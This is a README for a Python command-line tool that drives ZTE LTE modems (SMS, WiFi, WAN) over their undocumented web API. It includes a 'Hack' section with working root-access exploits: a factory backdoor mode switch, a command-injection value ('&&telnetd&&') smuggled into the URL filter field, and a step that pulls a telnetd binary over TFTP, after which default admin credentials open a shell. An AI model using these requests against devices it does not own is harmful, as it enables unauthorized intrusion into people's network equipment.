# ZTE Modem CLI

Python CLI for controlling ZTE modems — SMS, WiFi, WAN, and root access hacks.

**Tested on:** MF253M — also works with MF823L, MF286, and other ZTE models with a Web GUI.

---

## Quick Start

**Requires:** Python 3.8+

```bash
pip install -r requirements.txt
```

Copy `.env.example` to `.env` and set your credentials:

```
MODEM_IP=192.168.0.1
PASSWORD=admin
```

> The password must be **base64-encoded**. Use `base64` in your terminal or [base64encode.org](https://www.base64encode.org).

---

## CLI Usage

```
python zte.py [--ip IP] [--password PASS] <command> [args]
```

The `--ip` and `--password` flags override the `.env` values for a single run.

| Command         | Args                    | Description                          |
|-----------------|-------------------------|--------------------------------------|
| `login on`      |                         | Log in to the modem                  |
| `login off`     |                         | Log off from the modem               |
| `ls`            |                         | List all SMS messages                |
| `rm <id>`       | Message ID              | Delete a specific message            |
| `rm *`          |                         | Delete all messages                  |
| `snd <phone> <msg>` | Phone number, message | Send an SMS                      |
| `wifi on\|off`  |                         | Enable or disable WiFi               |
| `wan on\|off`   |                         | Connect or disconnect WAN            |
| `hack`          |                         | Hack modem — Method 2 (built-in telnetd) |
| `hack3 [tftp_ip]` | TFTP server IP        | Hack modem — Method 3 via `zte_debug.sh` |
| `hack3d [tftp_ip]` | TFTP server IP       | Hack modem — Method 3 direct         |

---

## Running Tests

```bash
pytest tests/
```

---

## API Reference

The modem exposes an undocumented HTTP API. All requests require a `Referer` header pointing to the modem's index page.

### Authentication

**Login**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

isTest=false&goformId=LOGIN&password=<base64_password>
```
Response: `{"result":"3"}` on success, `{"result":"1"}` on failure.

**Logoff**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

isTest=false&goformId=LOGOFF
```
Response: `{"result":"sucess"}`

---

### SMS

**List messages**
```
GET http://<modem_ip>/goform/goform_get_cmd_process
    ?isTest=false&cmd=sms_data_total&page=0&data_per_page=500
    &mem_store=1&tags=10&order_by=order+by+id+desc
Referer: http://<modem_ip>/index.html
```
Response: `{"messages": [...]}`

**Send a message**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

isTest=false&goformId=SEND_SMS&notCallback=true
&Number=<url_encoded_phone>&sms_time=<datetime>
&MessageBody=<hex_encoded_message>&ID=-1&encode_type=UNICODE
```
- Phone number must be URL-encoded.
- Message body must be hex-encoded.

Response: `{"result":"success"}`

**Delete a message**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

isTest=false&goformId=DELETE_SMS&msg_id=<id>;&notCallback=true
```
To delete multiple messages, repeat with each ID.

Response: `{"result":"success"}`

---

### WiFi

**Enable**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=1
```

**Disable**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=0
```

Response: `{"result":"success"}`

---

## Hack

These methods gain root/telnet access to the modem. Requires `curl` and `telnet`.

### Method 2 — Built-in Telnetd (NVRAM exploit)

**Step 1: Enable factory backdoor**
```
POST http://<modem_ip>/goform/goform_set_cmd_process?isTest=false
     &goformId=CHANGE_MODE&change_mode=2&password=<base64_password>
Referer: http://<modem_ip>/index.html
```
Response: `{"result":"success"}`

**Step 2: Exploit NVRAM to start telnetd**
```
POST http://<modem_ip>/goform/goform_set_cmd_process
Referer: http://<modem_ip>/index.html

isTest=false&goformId=URL_FILTER_ADD
&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26
```
Response: `{"result":"success"}`

**Step 3: Connect via Telnet**
```
telnet <modem_ip> 4719

User: admin
Pass: admin
```

### Method 3 — TFTP Telnetd

Fetches a `telnetd` binary from a TFTP server on your network and starts it on port 23. Run `hack3` or `hack3d` from the CLI — see the command table above.

Default TFTP server IP: `192.168.0.22` (override by passing your IP as an argument).

After the exploit: `telnet <modem_ip> 23` with `admin/admin`.

---

## Credits

- [paulo-correia](https://github.com/paulo-correia) — original repository author
- [taisto.org/ZTE_MF823D](https://taisto.org/ZTE_MF823D) — original PHP class
- [mariodian](https://gist.github.com/mariodian/65641792700d237d30f3f47d24c746e0) — shell script reference
- [mariodian](https://gist.github.com/mariodian/bafe4b0a83226d7680ee41424c4e5b7b) — Pushover integration
- [pushover.net](https://pushover.net)
- [fr.net.br](https://www.fr.net.br/2016/02/modem-zte-mf823l-avaliacao.html) — MF823L info
- [my-router.blogspot.com](http://my-router.blogspot.com/2015/09/zte-mf823-4g-change-ip-of-modem-and-get.html) — IP/root access guide
- [asiantuntijakaveri.fi](http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html) — MF286 backdoor research
- [base64encode.org](https://www.base64encode.org)
- [incarnate.github.io/curl-to-php](https://incarnate.github.io/curl-to-php/) — curl-to-PHP converter
